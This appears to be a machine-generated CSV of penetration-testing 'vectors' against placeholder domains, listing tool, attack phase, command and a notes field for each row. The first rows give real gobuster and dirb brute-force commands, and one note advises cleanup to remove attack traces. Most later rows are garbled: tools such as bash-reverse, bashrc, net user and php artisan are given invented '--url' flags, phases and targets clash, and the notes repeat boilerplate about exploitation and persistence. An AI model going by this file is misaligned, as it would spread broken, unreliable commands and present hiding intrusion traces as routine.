target_type,subtype,phase,tool,command,notes
WebApp,Joomla,Scanning,gobuster,gobuster dir -u http://target0.com -w /usr/share/wordlists/dirb/common.txt,"Use Gobuster to recursively brute-force directory names in a Joomla installation. This helps uncover hidden admin panels, backup folders, or development endpoints that are often missed in a basic crawl. Results can reveal misconfigurations, forgotten scripts, or old admin paths vulnerable to exploitation."
WebApp,Drupal,Cleanup,dirb,dirb http://target1.com /usr/share/wordlists/dirb/common.txt,"After exploiting Drupal, run Dirb to identify any lingering directories that may contain sensitive information or exploitable files. Focus on paths like /old/, /dev/, /backup/, or leftover modules. Proper post-exploitation cleanup is essential to remove attack traces and prevent privilege escalation."
Network,General,Reconnaissance,php artisan,php artisan --url http://autotarget2.com,"This vector uses php artisan during the reconnaissance phase against a General application. It targets http://autotarget2.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Exploitation,dirb,dirb --url http://autotarget3.com,"This vector uses dirb during the exploitation phase against a General application. It targets http://autotarget3.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Reconnaissance,bash-reverse,bash-reverse --url http://autotarget4.com,"This vector uses bash-reverse during the reconnaissance phase against a Magento application. It targets http://autotarget4.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Enumeration,template-injection,template-injection --url http://autotarget5.com,"This vector uses template-injection during the enumeration phase against a FTP application. It targets http://autotarget5.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Scanning,ssh-keyscan,ssh-keyscan --url http://autotarget6.com,"This vector uses ssh-keyscan during the scanning phase against a WordPress application. It targets http://autotarget6.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Reconnaissance,magetool,magetool --url http://autotarget7.com,"This vector uses magetool during the reconnaissance phase against a Magento application. It targets http://autotarget7.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Persistence,net user,net user --url http://autotarget8.com,"This vector uses net user during the persistence phase against a FTP application. It targets http://autotarget8.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Cleanup,browser-exploit,browser-exploit --url http://autotarget9.com,"This vector uses browser-exploit during the cleanup phase against a ASP.NET application. It targets http://autotarget9.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Enumeration,bashrc,bashrc --url http://autotarget10.com,"This vector uses bashrc during the enumeration phase against a FTP application. It targets http://autotarget10.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Enumeration,nslookup,nslookup --url http://autotarget11.com,"This vector uses nslookup during the enumeration phase against a General application. It targets http://autotarget11.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Persistence,php artisan,php artisan --url http://autotarget12.com,"This vector uses php artisan during the persistence phase against a RDP application. It targets http://autotarget12.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
